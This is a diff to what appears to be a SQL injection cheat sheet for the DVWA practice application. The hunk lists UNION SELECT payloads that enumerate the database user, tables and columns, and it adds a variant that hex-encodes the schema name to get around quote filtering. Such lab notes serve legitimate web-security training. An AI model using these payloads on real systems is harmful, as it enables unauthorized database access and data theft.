@@ -19,6 +19,7 @@ UNION SELECT 1,user() /*
 Database tables:
 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = '[database name]' /*
 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' %23&Submit=Submit#
+UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 0x64767761 %23&Submit=Submit# // dvwa in hex
 
 Table Columns:
 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name = '[table name]' /*
